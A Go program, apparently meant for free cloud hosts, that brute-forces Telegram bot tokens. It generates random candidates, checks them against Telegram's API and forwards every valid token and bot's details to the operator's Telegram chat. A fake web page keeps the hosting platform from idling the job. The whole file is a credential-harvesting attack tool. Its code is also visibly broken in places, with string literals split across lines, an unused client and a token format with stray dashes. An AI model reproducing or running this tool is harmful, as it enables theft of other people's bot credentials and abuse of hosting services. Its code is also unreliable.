package main

import (
    "encoding/json"
    "flag"
    "fmt"
    "log"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    WORKERS     int
    BOT_TOKEN   = os.Getenv("BOT_TOKEN")
    CHAT_ID     = os.Getenv("CHAT_ID")
    activeChan  = make(chan string, 100)
    activeCount int
    mu          sync.Mutex
)

type BotInfo struct {
    Ok     bool `json:"ok"`
    Result struct {
        ID        int    `json:"id"`
        IsBot     bool   `json:"is_bot"`
        FirstName string `json:"first_name"`
        Username  string `json:"username"`
    } `json:"result"`
}

func init() {
    flag.IntVar(&WORKERS, "workers", 50, "Ping workers count")
    flag.Parse()
    
    if BOT_TOKEN == "" {
        log.Fatal("❌ BOT_TOKEN env required")
    }
    if CHAT_ID == "" {
        log.Fatal("❌ CHAT_ID env required")
    }
    fmt.Printf("✅ Config OK | Workers: %d
", WORKERS)
}

func generateRandomToken() string {
    numbers := "0123456789"
    letters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_"
    token := ""
    for i := 0; i < 8+rand.Intn(3); i++ {
        token += string(numbers[rand.Intn(10)])
    }
    token += ":"
    for i := 0; i < 40; i++ {
        if i%8 == 0 && i > 0 {
            token += "-"
        }
        token += string(letters[rand.Intn(len(letters))])
    }
    return token
}

func pingToken(token string) bool {
    resp, err := http.Get("https://api.telegram.org/bot" + token + "/getMe")
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    return resp.StatusCode == 200
}

func getBotInfo(token string) *BotInfo {
    resp, _ := http.Get("https://api.telegram.org/bot" + token + "/getMe")
    if resp.StatusCode != 200 {
        return nil
    }
    defer resp.Body.Close()
    
    var info BotInfo
    json.NewDecoder(resp.Body).Decode(&info)
    if !info.Ok || !info.Result.IsBot {
        return nil
    }
    return &info
}

func infoWorker() {
    for token := range activeChan {
        fmt.Printf("🔍 Processing: %s
", token[:20]+"...")
        
        info := getBotInfo(token)
        if info != nil {
            msg := fmt.Sprintf(
                "🎉 **Active token #%d**
**Bot name:** %s
**Bot username:** @%s
**Token:** `%s`
**ID:** `%d`",
                activeCount+1, info.Result.FirstName, info.Result.Username, token, info.Result.ID,
            )
            sendMsg(msg)
            mu.Lock()
            activeCount++
            mu.Unlock()
        }
    }
}

func sendMsg(text string) {
    msg := url.QueryEscape(text)
    _, _ = http.Get("https://api.telegram.org/bot" + BOT_TOKEN + 
        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg + "&parse_mode=Markdown")
}

func pingWorker(wg *sync.WaitGroup) {
    defer wg.Done()
    client := &http.Client{Timeout: 2 * time.Second}
    
    for {
        token := generateRandomToken()
        if pingToken(token) {
            select {
            case activeChan <- token:
            default:
            }
        }
        time.Sleep(50 * time.Millisecond)
    }
}

// 🔥 FAKE WEB SERVER (Koyeb/Render ke liye)
func fakeWebServer() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        mu.Lock()
        ac := activeCount
        mu.Unlock()
        html := fmt.Sprintf(`
        <!DOCTYPE html>
        <html>
        <head><title>Token Hunter</title></head>
        <body>
            <h1>🚀 Token Hunter Active</h1>
            <p><b>Workers:</b> %d</p>
            <p><b>Active Tokens Found:</b> %d</p>
            <p><b>Status:</b> Running 24/7 🟢</p>
            <p>Check your Telegram bot for results!</p>
        </body>
        </html>`, WORKERS, ac)
        w.Header().Set("Content-Type", "text/html")
        fmt.Fprint(w, html)
    })
    
    http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
        w.WriteHeader(200)
        fmt.Fprint(w, "OK")
    })
    
    // Koyeb port detect
    port := os.Getenv("PORT")
    if port == "" {
        port = "8080"
    }
    
    fmt.Printf("🌐 Fake web on :%s
", port)
    log.Fatal(http.ListenAndServe(":"+port, nil))
}

func main() {
    rand.Seed(time.Now().UnixNano())
    fmt.Printf("🚀 Secure Token Hunter | Workers: %d
", WORKERS)
    
    // Background workers start
    go infoWorker()
    var wg sync.WaitGroup
    for i := 0; i < WORKERS; i++ {
        wg.Add(1)
        go pingWorker(&wg)
    }
    
    // FOREGROUND: Fake web server (Koyeb ko happy rakhega)
    fakeWebServer()
}
